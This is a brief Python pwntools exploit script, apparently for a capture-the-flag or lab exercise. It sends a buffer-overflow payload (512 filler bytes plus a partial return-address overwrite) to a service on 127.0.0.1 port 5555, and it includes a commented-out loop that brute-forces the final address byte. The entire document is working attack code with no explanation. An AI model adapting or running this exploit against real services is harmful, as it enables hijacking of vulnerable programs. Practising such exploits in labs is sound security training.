from pwn import *
from time import sleep

payload = 'A'*512+'\x00\xf9\xdd\xcf'

'''
a = 0x0
while (a<0xff):
    p = remote('127.0.0.1', 5555)
    print p.recv()
    p.send(payload+chr(a))
    if 'Come back soon!' in p.recvall():
        print 'hahaha: ', a
        break
    print a
    a+=1
    p.close()
'''
p = remote('127.0.0.1', 5555)
print p.recv()
sleep(3)
p.sendline(payload)
print p.recvall()
